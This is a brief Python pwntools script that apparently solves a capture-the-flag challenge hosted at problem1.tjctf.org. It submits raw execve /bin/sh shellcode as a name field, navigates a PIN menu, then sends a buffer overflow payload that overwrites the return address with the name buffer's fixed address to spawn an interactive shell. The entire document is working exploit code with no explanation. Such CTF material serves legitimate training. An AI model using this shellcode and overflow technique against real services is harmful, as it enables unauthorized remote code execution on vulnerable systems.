from pwn import *

NAME_OFFSET = 0x6010a0

r = remote('problem1.tjctf.org', 8005)

# len(shellcode) = 27
r.recvuntil('Name: ')
name = '\xbf\x01\x01\x01\x01\x81\xf7\xb2\x11\x61\x01\x31\xd2\x31\xf6\xb0\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00'
r.sendline(name)

r.recvuntil('PIN: ')
r.sendline('AAAA')		# pin

r.recvuntil('quit\n')
r.sendline('d')

# BOF
r.recvuntil('PIN: ')
payload = ''
payload += 'A' * 17		# pin+dummy
payload += p64(NAME_OFFSET)	# return address
r.sendline(payload)

r.interactive()
